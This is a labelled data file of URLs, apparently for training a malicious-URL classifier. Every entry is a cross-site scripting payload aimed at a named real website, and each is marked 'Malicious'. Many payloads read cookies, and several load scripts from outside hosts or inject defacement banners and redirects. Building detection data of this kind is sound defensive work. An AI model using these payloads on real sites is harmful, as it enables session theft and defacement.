http://www.griffonbank.com/deu/support/search/?action=index&amp;text=%27%3e%3cscript%3ealert%28string.fr<br>omcharcode%2888%2c83%2c83%29%29%3c%2fscript%3e%3cimg+&amp;x=30&amp;y=7&amp;url=,Malicious
http://www.fifamaster.org/index.php?item=programme&amp;sub=assessment_and_exams}%3c/style%3e%3cscript%3e<br>a=eval;b=alert;a(b(/xss/.source));%3c/script%3e,Malicious
"http://pic3.piczo.com/go/forgotpwdwzd?pg=username&amp;svc=';alert(string.fromcharcode(88,83,83))//\';ale<br>rt(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromc<br>harcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/<br>script%3e",Malicious
https://www.cia.gov/search?ns-max-records=s[1]%22%3cscript%3ealert('pwned')%3c/script%3e,Malicious
https://www.fazenda.gov.br/busca.asp?pesquisa=%22%3e%27%3e%3cscript+src%3dhttp%3a%2f%2fvuln.xssed.ne<br>t%2fthirdparty%2fscripts%2fpython5.js%3e%3c%2fscript%3e,Malicious
https://help.ea.com/search?tag=manuals&amp;q=%3cscript%3ealert%28%22xss%22%29%3c/script%3e,Malicious
http://x.nest.jp/?d=2007-07-22'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.autosanjuan.com.ar/busqueda.php?x=0&amp;y=0&amp;anio_desde=%27%3e%3c%2fa%3e%3cscript%3ealert%28do<br>cument.cookie%29%3b%3c%2fscript%3e&amp;anio_hasta=&amp;km_desde=&amp;km_hasta=&amp;precio_desde=&amp;precio_hasta=&amp;tipo=<br>+++++++++1&amp;marca=0&amp;modelo=0&amp;estado=0&amp;segmento=0&amp;combustible=0&amp;tipo_vendedor=0&amp;ubicacion=0,Malicious
https://iforgot.apple.com/cgi-bin/webobjects/dsiforgot.woa/wa/authenticate?authenticationkey=aaaaaaa<br>aaaaaaaaaaaaaaaaaaaa&amp;language='&quot;--&gt;&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://rouqia.com/index.php?var=medecine-prophete_hijama&amp;lg=fr/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious
http://help.travian.hu/index.php?type=faq&amp;mod=%22%3e%3cscript%3ealert%28%2fxss+by+redtuning%2f%29%3b<br>%3c%2fscript%3e,Malicious
http://www.inhealthnw.com/story.php?id=143%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://blog.meebo.com/?year=%3c/title%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.christkindlmarkt-regensburg.de/index.php?newlang=%22%3e%3cscript%3ealert(/xss/.source)%3c<br>/script%3e,Malicious
http://assist.daps.dla.mil/quicksearch/quicksearch_query.cfm?doc_id=&amp;doc_number=&amp;title=%22%3e%3cscri<br>pt%3ealert%28%22xss%22%29%3c%2fscript%3e%3c%22,Malicious
http://pam.byu.edu/similarpage.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/script&gt;&lt;meta<br>http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious
http://nebraskalegislature.gov/contact/email_form.php?to=%3c/script%3e%3cscript%3ealert(document.coo<br>kie)%3c/script%3e,Malicious
http://www.fsvts.gov.ru/kvts-portal.nsf/display?openagent=&amp;posting=1&amp;pagename=search.html&amp;extended=1<br>&amp;word_1=&quot;&gt;&lt;script&gt;alert(&quot;arham+muhammad&quot;);&lt;/script&gt;&amp;word_2=&quot;&gt;&lt;script&gt;alert(&quot;arham+muhammad&quot;);&lt;/scrip<br>t&gt;&amp;word_3=&quot;&gt;&lt;script&gt;alert(&quot;arham+muhammad&quot;);&lt;/script&gt;&amp;word_4=&quot;&gt;&lt;script&gt;alert(&quot;arham+muhammad&quot;);&lt;/scr<br>ipt&gt;&amp;datetype=&amp;dateoperation=&amp;date=&amp;database=formal&amp;objects=&amp;max=100&amp;sort=,Malicious
http://www.youlist.jp/tag/%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%<br>3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
"http://www.dancesport.ro/cluburi_lst.php?judet=&lt;script&gt;alert(/xssed%20by%20dr.optix/);alert(/bia,%20<br>ani%20veatah%20neshane%20et%20haolam!%20yihyeh%20beseder!...zot%20omeret....%20ani%20ohev%20otach!/)<br>&lt;/script&gt;",Malicious
http://www.sportanddev.org/newsnviews/search.cfm?usearchterm=%27%22%3e%3c%2ftitle%3e%3cscript%3ealer<br>t(1337)%3c%2fscript%3e,Malicious
http://pl.playstation.com/search-results/?searchpattern=%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c<br>/script%3e%3ch1%3e%3cmarquee%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;submit-search=search,Malicious
http://www.adobe.com/bin/presenter.cgi?presenter_fname=%22%3e%3cscript%3ealert%28%22xss%22%29%3c%2fscript%3e&presenter_lname=&presenter_title=&presenter_company=&presenter_address1=&presenter_address2=&presenter_city=&presenter_state=unselected&presenter_ostate=&presenter_zip=&presenter_email=&presenter_phone=&presenter_event=&presenter_presenter=&presenter_response1=agree&user_submitted=yes&product_flag=%27%24product_flag%27,Malicious
http://www.miglioman.altervista.org/prova/index.php?site=forum_topic&amp;topic=1&amp;type=asc&amp;page=%22%3e%3c<br>/a%3e%3cscript%3ealert(document.cookie);%3c/script%3e%3c!--,Malicious
http://pic2.piczo.com/go/login?cr=3&amp;password=e0bc0dd70faa8c6e1fa10fd428e573ce&amp;svc=pz&amp;ph=true&amp;remembe<br>rme=n&amp;sv=y&amp;fp=c5fbw4ncdus9homyy7jl/tvnrls=&amp;cr=3&amp;cs=g5ygalxz%2b1186703406393&amp;username=%22%3e%3cscript<br>%3ealert(1)%3c/script%3e&amp;jump=&amp;rfm=y,Malicious
http://www.vodafone.com.au/searchresults/index.jsp?view=&amp;query=%22%3cscript%3ealert%28%22xssed%22%29<br>%3c%2fscript%3e%22%3cscript%3ealert%28%22xssed%22%29%3c/script%3e%22%3cscript%3ealert%28%22xssed%22%<br>29%3c/script%3e,Malicious
http://shop.ebay.co.uk/?_from=r40&amp;_npmv=3&amp;_trksid=m38&amp;_nkw=%3cscript%3ealert%28%27seymen%27%29%3b%3c<br>%2fscript%3e&amp;_nd1=see-all-categories,Malicious
http://so.tudou.com/isearch.do?kw=%22%3e%27%3e%3cscript%3ealert%28123%29%3c%2fscript%3e%22%27,Malicious
http://search.macupdate.com/search.php?keywords=}%3c%2fsty%22%3e%3c%2fiframe%3e%3cscript%3ealert%281<br>23%29%3c%2fscript%3ele%3e%3cscript%3ea%3deval%3bb%3dalert%3ba%28b%28%2fxss%2f.source%29%29%3b%3c%2fs<br>cript%3e%27%22%3e%3cmarquee%3e%3ch1%3ex%3c%2fh1%3e%3c%2fmarquee%3e&amp;os=mac,Malicious
http://cvs.uwc.ac.za/viewcvs/viewcvs.cgi/odimex/modules/postlogin/resources/x.js?cvsroot=&quot;&gt;&lt;script&gt;a<br>lert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://kokonet.jp/search/index.php?mode=dir&amp;path=06/02/'%3e%22%3e%3cscript/src=http://kusomiso.com/x<br>ss.js%3e%3c/script%3e,Malicious
http://www.seduc.to.gov.br/index.php?option=com_content&amp;task=view&amp;id=730&amp;itemid=%22%3e'%3e%3cscript%<br>20src=http://vuln.xssed.net/thirdparty/scripts/python5.js%3e%3c/script%3e0,Malicious
http://www.xzqh.cn/otype_g.asp?owen1=%3cscript%3ealert(%22xss%22)%3c/script%3e&amp;owen2=%cd%bc%c6%ac%b1<br>%a8%b5%c0,Malicious
http://www.avatarmovie.com/becomeanavatar/index.php?uid=f1e27f7794e2a9850957ad5adea90cbe&amp;n=%3cscript<br>%3ealert%28/zack%20@%20insecurity.ro/%29%3c/script%3e,Malicious
http://www.aufeminin.com/communaute/basemails/basemails.asp?em=%27%22%3e%3c/title%3e%3cscript%3ealer<br>t(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://xssed.by.azat.photobucket.com/guestlogin?loginform[albumurl]=http://s289.photobucket.com/albu<br>ms/ll233/&gt;&lt;script&gt;alert(&quot;xssed%20by%20azat&quot;)&lt;/script&gt;&gt;&lt;script&gt;alert(&quot;xssed%20by%20azat&quot;)&lt;/script&gt;&gt;&lt;s<br>cript&gt;alert(&quot;xssed%20byazat&quot;)&lt;/script&gt;&gt;&lt;script&gt;alert(&quot;xssed%20by%20azat&quot;)&lt;/script&gt;&gt;&lt;script&gt;alert(&quot;xs<br>sed%20byazat&quot;)&lt;/script&gt;&amp;loginform[redirectaction]=&amp;loginform[password]=&gt;&lt;script&gt;alert(&quot;xssed')&lt;/scri<br>pt&gt;&amp;login=&gt;&lt;script&gt;alert(&quot;xssed&quot;)&lt;/script&gt;,Malicious
http://search-o-rama.com/confirm/confirm.asp?semail=&amp;surl=%3cscript%3ealert('hacked%20st@rext')%3c/s<br>cript%3e,Malicious
http://politiken.dk/sog/index.jsp?ecemode=search&amp;eceform=simple&amp;ecesort=descending&amp;eceexpr='%22%3e%3<br>cscript%3ealert(document.cookie)%3c/script%3e&amp;ecesection=9,Malicious
http://inscription-ira.fonction-publique.gouv.fr/inscription_ira/modif.cfm?action=%22%3e'%3e%3cscrip<br>t%20src=http://vuln.xssed.net/thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://www.science-shop.de/sixcms/detail.php?template=d_shop_treffer&amp;_schnellsuche=%22%3e%3cscript%3<br>ealert%281%29%3c%2fscript%3e&amp;x=30&amp;y=15,Malicious
http://www.t-com.de/katalogk_pk_katalog_tarifuebersicht;sid=opcgv3sgvhmgvz6_xz8mz1oohzz5op-3vllfoey1<br>6bbfyo6rxcm=a&quot;;&lt;/script&gt;&lt;script&gt;alert('by//panzerturk');&lt;/script&gt;,Malicious
http://www.akpartiseferihisar.com/resim_galerisi/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://passrewards.americanexpress.com/sr____.htm?cat=952&amp;page=7&amp;mnpos=&quot;&gt;&lt;script&gt;alert('xss')&lt;/scri<br>pt&gt;,Malicious
http://dc.lib.unc.edu/cdm4/results.php?cisoop1=any&amp;cisofield1=cisosearchall&amp;cisoroot=/vir_museum&amp;cis<br>obox1=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.cgi-down.com/sample/upbbs.cgi?mode=change&amp;no=1'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by<br>%20kusomiso.com%22)%3c/script%3e,Malicious
http://council.jeongseon.go.kr/way-board/way-board.php?db=&quot;&gt;&lt;script&gt;alert(&quot;cyber//for-ferda&quot;)&lt;/scrip<br>t&gt;,Malicious
http://gazetemuzik.org/scripts/kayit.asp?id=3558&amp;dil=tr&amp;page=grup.asp&amp;results=&quot;&gt;&lt;script&gt;alert(docume<br>nt.cookie)&lt;/script&gt;,Malicious
http://rinn.e-site.jp/bbs/%22%3e'%3e%3cscript%3ealert('xss')%3c/script%3e/,Malicious
http://homepage.naver.com/browse/search.php?where=keyword&amp;keyword=%22%3e%3cscript%3ealert(1)%3c/scri<br>pt%3e,Malicious
http://www.roder.org.tr/tr/members/default.asp?mode=1&amp;fcaption1=1&amp;fcaption2=2&amp;fcaption3=3&amp;fcaption4=<br>0&amp;fcaption5=0&amp;fsearchstr=&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(12)&lt;/script&gt;,Malicious
http://videos.emule.com/download.php?id=3lmmcyxe5k0&amp;eurl=&amp;titulo=%22%3e%3cscript%3ealert(document.co<br>okie)%3c/script%3e,Malicious
http://www.gametrailers.com/gthd.php?order_by=date+desc%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65<br>%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%<br>31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%3<br>6%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
https://s18.enlight.net/phoenix/ls/login.jsp?language=%22%3e%3c/iframe%3e%3cscript%3ealert(123)%3c/s<br>cript%3e,Malicious
"http://l.yimg.com/m/ver/270.0/embed-2008-08-14-1438/fullscreen.html?&seek=0&kbps=0&eautostart=""><script>alert('xss')</script>",Malicious
http://www.powerscripts.info/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious
http://www.warez.sg/parking.php4?task=search&amp;domain=warez.sg&amp;s=d98cb5b1e81a8934b3fb&amp;tb=0&amp;a_id=2&amp;lang<br>uage=en&amp;pxy_t=0&amp;start=1&amp;add_c=f05afa93236c58adb5433f933b47cd38&amp;pgt=uc6n6elphz4kewj7877r-luoahufnv4kh<br>zbgskeyacaamivwoam4fq&amp;keyword='%3e%22%3e%3cscript/src=http://kusomiso.com/x.js%3e%3c/script%3e&amp;pos=8<br>&amp;sub=1,Malicious
http://preisvergleich.zdnet.de/hefter-mappe_c__1888.cat?showoffers=1&amp;lp=1&amp;up=2&amp;ofo=p%22%3e%3cscript%<br>3ealert(document.cookie)%3c/script%3e,Malicious
http://website.ws/kvmlm2/ws.dhtml?domain=%22%3e%3cscript%3ealert(%22bayraminiz+m%fcbarek+olsun%22)%3<br>c/script%3e,Malicious
http://www.dinero.com/wf_buscararticulos.aspx?buscar=&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(123)&lt;/script&gt;&amp;tipo=0&amp;p<br>agina=1&amp;orden=1,Malicious
http://store.apple.com/us/search?find=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e%<br>3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
http://hr.cch.com/hhrlib/issues-answers/employer-group-waivers-granted-for-retiree-drug-coverage-und<br>er-medicare-part-d.asp?date=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.azom.com/search.asp?q=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;btng=search+azom&amp;sort=date:d:l:d1&amp;outpu<br>t=xml&amp;lr=&amp;client=azom&amp;filter=0&amp;image1.x=20&amp;oe=utf8&amp;ie=utf8&amp;image1.y=22&amp;site=azom-articles|azom-news|<br>azom-suppliers|azom-books|azom-courses|azom-events,Malicious
http://weather.mysanantonio.com/auto/mysanantonio/radar/radblast.asp?zoommode=pan&amp;prevzoom=zoom&amp;num=<br>6&amp;frame=0&amp;delay=15&amp;scale=0.250&amp;noclutter=1&amp;id=ewx&amp;type=n0r&amp;showstorms=0&amp;lat=0&amp;lon=0&amp;label=you&amp;map.x=<br>400&amp;map.y=240&amp;scale=0.250&amp;centerx=586&amp;centery=76&amp;showlabels=1&amp;rainsnow=0&amp;lightning=0&amp;lerror=20&amp;num_s<br>tns_min=2&amp;num_stns_max=9999&amp;avg_off=9999&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://demo.oxylustemplates.com/fluxglide-demo/index.php/our-blog/search/?q=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious
http://cn.boincstats.com/search/result.php?searchname='%3e%22%3e%3ciframe%20src=http://kusomiso.com/<br>xss.html%20%3c,Malicious
http://login.community.virgilio.it/community/people.html?a2_chid=people&a2_finurlok=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://chileabroad.gov.cl/lisboa/en/2011/06/17/los-dias-18-y-19-de-junio-se-realiza-el-2-arraial-lat<br>inoamericano-en-lisboa/%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,Malicious
"http://infoguides.gmu.edu/searchtags.php?iid=&amp;tag=%27;alert%28string.fromcharcode%2888,83,83%29%29//<br>\%27;alert%28string.fromcharcode%2888,83,83%29%29//%22;alert%28string.fromcharcode%2888,83,83%29%29/<br>/\%22;alert%28string.fromcharcode%2888,83,83%29%29//--%3e%3c/script%3e%22%3e%27%3e%3cscript%3ealert%<br>28string.fromcharcode%2888,83,83%29%29%3c/script%3e",Malicious
http://www.openldap.org/faq/index.cgi?_reason=6%20%3cscript%3ealert%281%29%3c/script%3e&amp;_restart=edi<br>tmodoptions&amp;cmd=authenticate&amp;editcmds=compact&amp;file=43,Malicious
http://emailbrain.domain.com/rwcode/subscribe.asp?siteid=3924&amp;mode=%22%3e%3cscript%3ealert(%22daimon<br>%22)%3c/script%3e,Malicious
http://miso.com/hma/hma_service03.php?onmenu=m'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%<br>3c/script%3e,Malicious
http://www.inteatro.gob.ar/2008/noticias.php?id=195&amp;cat=%22%3e%3ciframe+onload%3dalert%28%2fxss%2f%2<br>9%3e,Malicious
http://tonalites.orange.fr/index.php?id=%22%27%3e%3cscript%3ealert%28/your%20been%20owned%20xss/%29%<br>3c/script%3e&amp;dub=1,Malicious
http://atlanta.braves.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://demo.atmail.org/parse.php?file=html/%22$this-%3eusername%22%3ciframe%20src=%22http://xssed.co<br>m%22%3e/help/filexp.html&amp;firstload=1&amp;helpfile=loginhelp.html,Malicious
http://cnsdl.miis.edu/cnserd/results.asp?keyword=%22%3e%3cscript%3ealert%28%22pwnd+for+big-h+yo+%28%<br>3b%22%29%3c%2fscript%3e&amp;using=all+words&amp;order=relevancy&amp;feature=&amp;teachingtool=&amp;level=&amp;language=&amp;orgc<br>ategory=,Malicious
http://newaccounts.freewebs.com/directory/viewsites.jsp?query=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.sakamoto.or.jp/cgi-bin/diary/diary.cgi?year=2007&amp;month=10&amp;day=8'%3e%22%3e%3cscript/src=ht<br>tp://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://kproxy.com/error.jsp?error=&lt;marquee&gt;&lt;img%20src=http://i22.photobucket.com/albums/b346/a429mys<br>pace/owned/owned-shark.jpg&gt;,Malicious
http://compton.parish.hants.gov.uk/meldrew/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%<br>3c/script%3e,Malicious
http://www.domesticinstallations.com/portfolio/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.tmb.net/ca_es/barcelona/moute/planols/lineametroplano.jsp?linia=3%22%20%3cscript%3ealert(<br>'xss')%3c/script%3e,Malicious
http://www.allo.perm.ru/site?resource=%3cscript%3ealert('pappy%20was%20here!');%3c/script%3e,Malicious
http://www.puntoradiotudela.com/descargas.php?programa=%3cscript%3ealert(1);document.write(%22%3ch1%<br>3e0wn3d%3c/h1%3e%22)%3c/script%3e,Malicious
http://search.time.com/results.html?query=%22%3e%3cscript%3ealert(%27xss%27)%3c/script%3e,Malicious
http://www.isvicre-sigorta.com.tr/index.php?a=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://programa.gobiernoenlinea.gov.co/servicios.shtml?apc=i----&amp;x=1138}%3c/style%3e%3cscript%3ea=ev<br>al;b=alert;a(b(/xss/.source));%3c/script%3e,Malicious
http://search.rediff.com/imgsrch/default.php?mt=dalai%20lama&amp;start=&amp;perpage=6&amp;page=1&amp;filter=0&amp;imgsiz<br>e=%22%3e%3cscript%3ealert(document.cookie)%3c%2fscript%3e,Malicious
http://www.galileocomputing.de/buchscanner/ergebnis?galileosession=&amp;suchstring=%3c%22%3c%3cscript%3e<br>alert(%22xssed%20by%20kingofchaos%22)%3c/script%3e,Malicious
http://www.fastnet.co.uk/index.php?path=search.php&amp;words=%22%3e%3cmarquee%3e%3ch1%3edefaced+by+ironz<br>org%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
http://electronicdesign.com/articles/index.cfm?action=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://www.justmyshop.com/app/servlet/campaign?id=67108864&amp;groupid=a%22%3e'%3e%3c/script%3e%3cscrip<br>t%3ealert(%22x%22)%3c/script%3e&amp;page=1#9005175,Malicious
http://zone.org/search.php?search_type=1&amp;contenttype=vbblog_blogentry&amp;query=%22%3e%3cscript%3ealert%<br>28%22daimon%22%29%3c/script%3e,Malicious
http://photos.wingsurfer.co.uk/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcot<br>icxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://kb.brinkster.com/?ssearch=%3ciframe+src%3dhttp%3a%2f%2fgoogle.com%3e%3c%2fiframe%3e%3cscript+<br>src%3dhttp&amp;ssearchmethod=all%7ewords&amp;saction=search&amp;ssearchin=title%7carticle,Malicious
http://www.bannemer.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;bac<br>kdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.apxendex.com/index.php?id=32%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://netac150.vie.hosting.nokia.com/pkgbuilder/src/pkgbuilderhelp.jsp?u=kiktsz4wuq5c6&amp;lng=%3cscrip<br>t%3ealert%28/xss/%29%3c/script%3e,Malicious
http://spseudo.olympe-network.com/index.php?pseudo=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/s<br>cript%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
https://bankingportal.sparkasse-hochrhein.de/banking/?konto=%22%3e%3ciframe%20src=http://www.google.<br>de%3e,Malicious
http://www.govtrack.us/congress/vote.xpd?vote=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script<br>%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.yesilisikehliyet.com/forum2/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.coo<br>kie)&lt;/script&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://link.members.freewebs.com/members/comments/listpagedcommentsjs.jsp?userid=19405329&amp;limit=20&amp;p<br>agenumber=3&amp;commentsettingid=1053604&amp;callback=%3cscript%3ealert(/xss/)%3c/script%3efw.instances.get(<br>%22myguestbook%22).populatecommentdiv&amp;loadratings=false&amp;ratingcallback=fw.instances.get(%22myguestbo<br>ok%22).instance.parent.getratingcallback&amp;rand=0.590273475706508&amp;repeatlimit=40,Malicious
http://www.ulkuocaklari.org.tr/ocak.asp?ocak=%22%3e%3cscript%3ealert(%22siz%20%fclkemiz%20i%e7in%20s<br>adece%20bir%20tehditsiniz%20salaklar%20b%f6yle%20%fdrk%20ay%fdr%fdm%fdm%fd%20yaparak%20kendinizi%20k<br>and%fdr%fdyorsunuz...t%fcrkiyemizi%20b%f6yle%20k%fc%e7%fcltecek%20ve%20rezil%20edecek%20planlar%20ya<br>pars%fdn%fdz%20salaklar%20ancak%20b%f6le%20konu%feabilirsiniz%20s%fdk%fdysa%20da%f0a%20%e7%fdk%fdp%2<br>0can%fdn%fdz%fd%20versenize%20lan%20hayat%20k%fdsa!k%fcrt%20yada%20t%fcrk%20alevi%20yad%20s%fcni%20n<br>e%20farkeder%20sava%felarda%20atalar%fdm%fdz%20birlikte%20can%20vermedilermi!siktirin%20gidin%20%fdr<br>k%e7%fd%20pi%e7ler!%20%20atat%fcrk%20derki:'yurta%20bar%fd%fe%20d%fcnyada%20bar%fd%fe'.%20unutmadan%<br>20%fclke%20size%20kald%fdysa%20eywah!%22)%3c/script%3e%3c/script%3c,Malicious
http://talebe.net/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.smeclub.net/plaza247/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.luecht-palm.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://alltime.cc/test/read.cgi?q=kusomiso.com%3c/title%3e'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20b<br>y%20kusomiso.com%22)%3c/script%3e&amp;bbs=head&amp;key=1184815219,Malicious
http://www.ittc.com.ar/capacitacion.php?cat=2&amp;sct=%22%3e%3cscript%20src=http://vuln.xssed.net/thirdp<br>arty/scripts/ckers.org.js%3e%3c/script%3e,Malicious
http://www.visual.paginegialle.it/pg/cgi/pgvisual.cgi?cf=66&amp;l=1&amp;cb=0&amp;ind=scr34m%22%3e%3cimg%20src=%2<br>2http://img96.imageshack.us/img96/8009/xssks5.jpg%22%3e,Malicious
http://fr.myweb2.search.yahoo.com/yhs/search?fr=yhs-ipnmrtl&amp;ei=utf-8&amp;lyt=st&amp;p=&quot;&gt;&lt;script&gt;alert(docume<br>nt.cookie)&lt;/script&gt;,Malicious
http://reviews.cnet.com/1770-5_7-0.html?query=+}%3c%2fstyle%3e%3cscript%3ea%3deval%3bb%3dalert%3ba(b<br>(%2fxss%2f.source))%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss+by+xylitol%3c%2fh1<br>%3e%3c%2fmarquee%3e,Malicious
http://www.banquepopulaire.fr/scripts/groupe/publigen/content/templates/show.asp?p=207&amp;l=fr&amp;full_tex<br>t=&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;,Malicious
http://etracker.emstaxipost.be/index.asp?lang='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cm<br>arquee%3ewhitehat%20forever%3c/marquee%3e,Malicious
http://www.procuraduria.gov.co/portal/index.jsp?option=%22%3e%3cscript%3ealert%28document.cookie%29%<br>3c/script%3e,Malicious
http://www.pasoindir.com/search.php?q=%22%3e%3clink%20href=http://starext.by.ru/css.css%20type=text/<br>css%20rel=stylesheet%3e,Malicious
http://www.udskior.gov.pl/index.php?fraza=&lt;/style&gt;&lt;script&gt;a=eval;b=alert;a(b(/alert!!!!/.source));&lt;/<br>script&gt;'&quot;&gt;&lt;marquee&gt;&lt;h1&gt;vir0e5 --------&gt; xss bug<br>detected&lt;/h1&gt;&lt;/marquee&gt;&lt;script&gt;a=eval;b=alert;a(b(/banditc0de xss/.source));&lt;/script&gt;,Malicious
http://www.sun.com/download/index.jsp?cat=patches%3cscript%3ealert('xss');%3c/script%3e&amp;tab=3,Malicious
http://www.wardscottages.com/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://www.ecoresponsabilite.ecologie.gouv.fr/recherche.php3?recherche=%22;alert(string.fromcharcode<br>(83,69,67,85,82,73,84,89,32,83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcha<br>rcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e&amp;type=artic",Malicious
http://email.rad.gov.tw/phpinfo.php?a[]=%3e%3cscript%3ealert(/kabus/);%3c/script%3e,Malicious
http://www.marinesanctuariesmedia.com/search.php?keyword=%3cscript%3ealert(document.cookie);%3c/scri<br>pt%3e,Malicious
http://www.muneccim.com/pais/goster.asp?burc=11&amp;tr=&quot;&gt;&lt;img<br>src=&quot;http://img61.imageshack.us/img61/4632/26vrul2.jpg&quot;&gt;,Malicious
http://danno002.u.la/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.com%<br>22)%3c/script%3e,Malicious
http://vmo.nasa.gov/index.php?tstyle=style12%27%22%3e%3cmarquee%3e%3cimg%20src=k.png%20onerror=alert<br>(/xss/.source)%20/%3e,Malicious
http://www.oiwsba.com/oiwsba/memberinfo.php?id=54%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://stores.musictoday.com/store/dept.asp?band_id=64&amp;dept_id=140&amp;sfid=%22%3e%3cbody/onload=alert(/<br>xss/)%3e,Malicious
http://www.trendmicro-middleeast.com/search/?entity=enterprise&amp;master=true&amp;searchword=%22%3e%27%3e%3<br>cscript+src%3dhttp%3a%2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fpython5.js%3e%3c%2fscript%3e,Malicious
